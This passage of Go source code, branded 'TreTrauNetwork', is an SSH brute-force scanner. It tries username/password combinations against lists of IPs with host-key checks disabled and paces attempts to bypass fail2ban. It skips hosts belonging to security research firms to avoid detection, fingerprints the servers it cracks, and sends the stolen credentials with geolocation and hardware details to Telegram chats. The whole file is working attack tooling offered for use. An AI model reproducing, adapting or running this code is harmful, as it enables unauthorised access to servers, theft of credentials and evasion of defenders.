	client := &http.Client{Timeout: 5 * time.Second}

	// API 1: ipinfo.io
	if resp, err := client.Get("https://ipinfo.io/" + ip + "/json"); err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		json.Unmarshal(body, &info)
		if info.Country != "" {
			return info
		}
	}

	// API 2: ip-api.com (fallback)
	if resp, err := client.Get("http://ip-api.com/json/" + ip); err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		var raw map[string]interface{}
		json.Unmarshal(body, &raw)
		info.Country = getStrVal(raw, "countryCode")
		info.Region = getStrVal(raw, "regionName")
		info.City = getStrVal(raw, "city")
		info.Org = getStrVal(raw, "isp")
		if info.Country != "" {
			return info
		}
	}

	// API 3: ipwhois.app (fallback)
	if resp, err := client.Get("https://ipwhois.app/json/" + ip); err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		var raw map[string]interface{}
		json.Unmarshal(body, &raw)
		info.Country = getStrVal(raw, "country_code")
		info.Region = getStrVal(raw, "region")
		info.City = getStrVal(raw, "city")
		info.Org = getStrVal(raw, "isp")
	}

	return info
}

func getStrVal(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}

func createTelegramBot() *tgbotapi.BotAPI {
	for {
		bot, err := tgbotapi.NewBotAPI(botToken)
		if err == nil {
			return bot
		}
		log.Printf("Bot error: %v. Retrying...", err)
		time.Sleep(5 * time.Second)
	}
}

// === SEND SUCCESS BATCH ===
func sendSuccessBatch(batch []Success) {
	bot := createTelegramBot()
	for _, s := range batch {
		// Escape all dynamic data
		ip := html.EscapeString(s.Info.IP)
		port := html.EscapeString(s.Info.Port)
		user := html.EscapeString(s.Info.Username)
		pass := html.EscapeString(s.Info.Password)
		host := html.EscapeString(s.Info.Hostname)
		osInfo := html.EscapeString(s.Info.OSInfo)
		sshVer := html.EscapeString(s.Info.SSHVersion)
		ports := html.EscapeString(strings.Join(s.Info.OpenPorts, ", "))
		country := html.EscapeString(s.IPInfo.Country)
		region := html.EscapeString(s.IPInfo.Region)
		city := html.EscapeString(s.IPInfo.City)
		org := html.EscapeString(s.IPInfo.Org)
		cpuCores := strconv.Itoa(s.Info.CPUCores)
		arch := html.EscapeString(s.Info.Architecture)
		cpuModel := html.EscapeString(s.Info.CPUModel)

		gpu := html.EscapeString(s.Info.GPUInfo)
		if gpu == "" {
			gpu = "N/A"
		}
		maxDisk := formatDiskSize(s.Info.MaxDiskGB)

		msg := fmt.Sprintf(`<b>Made By TreTrauNetwork</b>

🔐 <b>SSH ACCESS REPORT</b>

🎯 <b>Target:</b> <code>%s:%s</code>
👤 <b>User:</b> <code>%s</code>
🔑 <b>Pass:</b> <code>%s</code>

🖥️ <b>Host:</b> %s
🧩 <b>OS:</b> %s
🔌 <b>SSH:</b> %s
⚡ <b>Time:</b> %v
🚪 <b>Ports:</b> %s
🧠 <b>CPU:</b> %s
🏗️ <b>Arch:</b> %s
💾 <b>Chip:</b> %s
🎮 <b>GPU:</b> %s
💿 <b>Disk:</b> %s

🌍 <b>Country:</b> %s
📍 <b>Region:</b> %s
🏙️ <b>City:</b> %s
🏢 <b>Org:</b> %s
🪤 <b>Honeypot:</b> %d
⏰ <b>Timestamp:</b> %s`,
			ip, port, user, pass,
			host, osInfo, sshVer, s.Info.ResponseTime, ports, cpuCores, arch, cpuModel,
			gpu, maxDisk,
			country, region, city, org, s.Info.HoneypotScore,
			time.Now().Format("2006-01-02 15:04:05"))

		for _, id := range chatIDs {
			for {
				m := tgbotapi.NewMessage(id, msg)
				m.ParseMode = "HTML"
				if _, err := bot.Send(m); err == nil {
					break
				} else {
					log.Printf("Send failed: %v. Retrying in 3s...", err)
					time.Sleep(3 * time.Second)
				}
			}
		}
	}
}


func successBatchProcessor(ch chan Success) {
	var batch []Success
	const size = 2
	const timeout = 20 * time.Second
	timer := time.NewTimer(timeout)
	timer.Stop()

	for {
		select {
		case s, ok := <-ch:
			if !ok {
				if len(batch) > 0 {
					sendSuccessBatch(batch)
				}
				return
			}
			batch = append(batch, s)
			if len(batch) >= size {
				sendSuccessBatch(batch[:size])
				batch = batch[size:]
				timer.Reset(timeout)
			} else if len(batch) == 1 {
				timer.Reset(timeout)
			}
		case <-timer.C:
			if len(batch) > 0 {
				sendSuccessBatch(batch)
				batch = nil
			}
		}
	}
}



func banner() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	for range ticker.C {
		g, e, h := atomic.LoadInt64(&stats.goods), atomic.LoadInt64(&stats.errors), atomic.LoadInt64(&stats.honeypots)
		total := int(g + e + h)
		elapsed := time.Since(startTime).Seconds()
		speed := float64(total) / elapsed
		remain := float64(totalIPCount-total) / speed

		clear()
		fmt.Printf("File: %s | Timeout: %ds\n", ipFile, timeout)
		fmt.Printf("Workers: %d | Per: %d\n", maxConnections, concurrentPerWorker)
		fmt.Printf("Checked: %d/%d | Speed: %.2f/s\n", total, totalIPCount, speed)
		if total < totalIPCount {
			fmt.Printf("Elapsed: %s | Remain: %s\n", formatTime(int(elapsed)), formatTime(int(remain)))
		} else {
			fmt.Printf("Total: %s\n", formatTime(int(elapsed)))
		}
		fmt.Printf("Good: %d | Fail: %d | Honey: %d\n", g, e, h)
		if total >= totalIPCount {
			os.Exit(0)
		}
	}
}

func formatTime(sec int) string {
	d := sec / 86400
	h := (sec % 86400) / 3600
	m := (sec % 3600) / 60
	s := sec % 60
	return fmt.Sprintf("%02d:%02d:%02d:%02d", d, h, m, s)
}

func appendToFile(data, path string) {
	f, _ := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	f.WriteString(data)
}

// === FAIL2BAN BYPASS: Per-IP rate limiting ===
type IPTracker struct {
	FailCount   int
	LastAttempt time.Time
	Banned      bool
}

var (
	ipTrackers   = make(map[string]*IPTracker)
	ipTrackerMux sync.Mutex
)

func preConnectCheck(ip string) bool {
	ipTrackerMux.Lock()
	tracker, ok := ipTrackers[ip]
	if !ok {
		ipTrackers[ip] = &IPTracker{}
		ipTrackerMux.Unlock()
		return true
	}

	// IP đã bị cooldown
	if tracker.Banned {
		if time.Since(tracker.LastAttempt) > 60*time.Second {
			tracker.Banned = false
			tracker.FailCount = 0
			ipTrackerMux.Unlock()
			return true
		}
		ipTrackerMux.Unlock()
		return false
	}

	// Quá nhiều fail liên tiếp -> cooldown
	if tracker.FailCount >= 4 {
		tracker.Banned = true
		ipTrackerMux.Unlock()
		return false
	}

	failCount := tracker.FailCount
	lastAttempt := tracker.LastAttempt
	ipTrackerMux.Unlock()

	// Smart delay: tăng dần theo số lần fail + random jitter tránh pattern
	if failCount > 0 {
		jitter := time.Duration(rand.Intn(300)) * time.Millisecond
		minDelay := time.Duration(failCount*600)*time.Millisecond + jitter
		elapsed := time.Since(lastAttempt)
		if elapsed < minDelay {
			time.Sleep(minDelay - elapsed)
		}
	}

	return true
}

func recordAttempt(ip string, success bool) {
	ipTrackerMux.Lock()
	defer ipTrackerMux.Unlock()
	tracker := ipTrackers[ip]
	if tracker == nil {
		return
	}
	tracker.LastAttempt = time.Now()
	if success {
		tracker.FailCount = 0
		tracker.Banned = false
	} else {
		tracker.FailCount++
	}
}

// Dọn ipTrackers cũ — tránh memory leak khi scan lâu dài
func cleanupTrackers() {
	ticker := time.NewTicker(2 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		ipTrackerMux.Lock()
		now := time.Now()
		for ip, tracker := range ipTrackers {
			if now.Sub(tracker.LastAttempt) > 5*time.Minute {
				delete(ipTrackers, ip)
			}
		}
		ipTrackerMux.Unlock()

		mapMutex.Lock()
		// successfulIPs không cần dọn — giữ để tránh scan lại IP đã thành công
		mapMutex.Unlock()
	}
}

func calculateOptimalBuffers() int {
	return int(float64(maxConnections*concurrentPerWorker) * 1.5)
}

func setupEnhancedWorkerPool(combos, ips [][]string) {
	buf := calculateOptimalBuffers()
	taskQ := make(chan SSHTask, buf)
	var wg sync.WaitGroup

	for i := 0; i < maxConnections; i++ {
		wg.Add(1)
		go enhancedMainWorker(i, taskQ, &wg)
	}

	go banner()
	go successBatchProcessor(successChan)
	go cleanupTrackers()

	go func() {
		for _, c := range combos {
			for _, ip := range ips {
				taskQ <- SSHTask{IP: ip[0], Port: ip[1], Username: c[0], Password: c[1]}
			}
		}
		close(taskQ)
	}()

	wg.Wait()
	close(successChan)
}

func enhancedMainWorker(id int, q <-chan SSHTask, wg *sync.WaitGroup) {
	defer wg.Done()
	sem := make(chan struct{}, concurrentPerWorker)
	var inner sync.WaitGroup
	for t := range q {
		inner.Add(1)
		sem <- struct{}{}
		go func(task SSHTask) {
			defer inner.Done()
			defer func() { <-sem }()
			processSSHTask(task)
		}(t)
	}
	inner.Wait()
}

// Filter garbage output — chỉ skip output hoàn toàn vô nghĩa (banner/copyright)
// "Too many connections", "Connection closed" giờ sẽ được detectOutputAnomalies xử lý
func isValidShellResponse(info *ServerInfo) bool {
	lowerHost := strings.ToLower(info.Hostname)

	// Hostname quá dài = garbage banner
	if len(info.Hostname) > 100 {
		return false
	}
	// Multi-line hostname = banner
	if strings.Count(strings.TrimSpace(info.Hostname), "\n") > 0 {
		return false
	}
	// Copyright/WARRANTY banner thay cho shell
	for _, p := range []string{"copyright", "warranty", "last login:"} {
		if strings.Contains(lowerHost, p) {
			return false
		}
	}
	return true
}

func processSSHTask(t SSHTask) {
	// Fail2ban bypass: kiểm tra rate limit trước khi connect
	if !preConnectCheck(t.IP) {
		atomic.AddInt64(&stats.errors, 1)
		return
	}

	cfg := &ssh.ClientConfig{
		User:            t.Username,
		Auth:            []ssh.AuthMethod{ssh.Password(t.Password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(timeout) * time.Second,
		Config: ssh.Config{
			KeyExchanges: []string{
				"curve25519-sha256", "curve25519-sha256@libssh.org",
				"ecdh-sha2-nistp256", "diffie-hellman-group14-sha256",
			},
			Ciphers: []string{
				"aes128-gcm@openssh.com", "chacha20-poly1305@openssh.com",
				"aes128-ctr", "aes256-ctr",
			},
		},
	}

	// TCP keepalive: giữ kết nối ổn định, phát hiện dead connection nhanh
	dialer := &net.Dialer{
		Timeout:   time.Duration(timeout) * time.Second,
		KeepAlive: 15 * time.Second,
	}

	start := time.Now()
	conn, err := dialer.Dial("tcp", t.IP+":"+t.Port)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		recordAttempt(t.IP, false)
		return
	}
	// Deadline tổng cho toàn bộ connection — tránh treo vĩnh viễn
	conn.SetDeadline(time.Now().Add(45 * time.Second))

	// SSH handshake trên TCP connection đã có keepalive
	sshConn, chans, reqs, err := ssh.NewClientConn(conn, t.IP+":"+t.Port, cfg)
	if err != nil {
		conn.Close()
		atomic.AddInt64(&stats.errors, 1)
		recordAttempt(t.IP, false)
		return
	}
	client := ssh.NewClient(sshConn, chans, reqs)
	defer func() {
		client.Close()
		conn.Close()
	}()

	recordAttempt(t.IP, true)

	info := &ServerInfo{
		IP:           t.IP,
		Port:         t.Port,
		Username:     t.Username,
		Password:     t.Password,
		ResponseTime: time.Since(start),
		Commands:     make(map[string]string),
	}

	gatherSystemInfo(client, info)

	// Filter garbage output (copyright banners, etc) — skip silently
	if !isValidShellResponse(info) {
		atomic.AddInt64(&stats.errors, 1)
		return
	}

	// Mega-command trả về rỗng hoàn toàn = connection bị closed ngay → honeypot
	allEmpty := true
	for _, v := range info.Commands {
		if v != "" && v != "EMPTY" {
			allEmpty = false
			break
		}
	}
	if allEmpty || len(info.Commands) == 0 {
		info.IsHoneypot = true
		info.HoneypotScore = 10
		info.Hostname = "CONNECTION_CLOSED"
	} else {
		info.IsHoneypot = detectHoneypot(info)
	}

	// Score 11 = server real nhưng không check được hết thông tin -> coi là GOOD
	if info.HoneypotScore == 11 {
		info.IsHoneypot = false
	}

	key := t.IP + ":" + t.Port
	mapMutex.Lock()
	if _, ok := successfulIPs[key]; ok {
		mapMutex.Unlock()
		return
	}
	successfulIPs[key] = struct{}{}
	mapMutex.Unlock()

	ipinfo := getIPInfo(info.IP)

	// Geo info rỗng hoàn toàn = rất khả nghi (server real luôn có geo data)
	if ipinfo.Country == "" && ipinfo.Region == "" && ipinfo.City == "" && ipinfo.Org == "" {
		info.HoneypotScore += 3
		if info.HoneypotScore >= 6 {
			info.IsHoneypot = true
		}
	}

	// Post-check: known honeypot research / scanning organizations
	if !info.IsHoneypot {
		orgLower := strings.ToLower(ipinfo.Org)
		for _, hpOrg := range []string{
			"censys", "shadowserver", "greynoise", "bitsight", "binary edge",
			"rapid7", "recyber", "team cymru", "internet census", "honeypot",
			"security research", "palo alto", "crowdstrike", "recorded future",
			"virus total", "abuse.ch", "spamhaus",
		} {
			if strings.Contains(orgLower, hpOrg) {
				info.IsHoneypot = true
				info.HoneypotScore += 5
				break
			}
		}
	}

	if !info.IsHoneypot {
		atomic.AddInt64(&stats.goods, 1)
		line := fmt.Sprintf("%s:%s@%s:%s\n", info.IP, info.Port, info.Username, info.Password)
		appendToFile(line, "su-goods.txt")
		gpuStr := info.GPUInfo
		if gpuStr == "" {
			gpuStr = "N/A"
		}
		diskStr := formatDiskSize(info.MaxDiskGB)
		detailed := fmt.Sprintf(`Made By TreTrauNetwork
=== SSH ===
Target: %s:%s
Credentials: %s:%s
Hostname: %s
OS: %s
SSH Version: %s
Response Time: %v
Open Ports: %v
CPU Cores: %d
Architecture: %s
CPU Model: %s
GPU: %s
Max Disk: %s
Country: %s
Region: %s
City: %s
Org: %s
Honeypot Score: %d
Timestamp: %s
===========

`, info.IP, info.Port, info.Username, info.Password, info.Hostname, info.OSInfo, info.SSHVersion,
			info.ResponseTime, strings.Join(info.OpenPorts, ", "), info.CPUCores, info.Architecture, info.CPUModel,
			gpuStr, diskStr,
			ipinfo.Country, ipinfo.Region, ipinfo.City, ipinfo.Org, info.HoneypotScore, time.Now().Format("2006-01-02 15:04:05"))
		appendToFile(detailed, "detailed-results.txt")
		successChan <- Success{Info: info, IPInfo: ipinfo}
		fmt.Printf("SUCCESS: %s\n", line[:len(line)-1])
	} else {
		atomic.AddInt64(&stats.honeypots, 1)
		log.Printf("Honeypot: %s:%s (Score: %d)", info.IP, info.Port, info.HoneypotScore)
		
		if info.HoneypotScore >= 10 {
			appendToFile(fmt.Sprintf("HONEYPOT_HIGHSCORE: %s:%s@%s:%s (Score: %d) CPU: %d\n", 
				info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores), "honeypots.txt")
		} else {
			appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d) CPU: %d\n", info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores), "honeypots.txt")
		}
	}
}
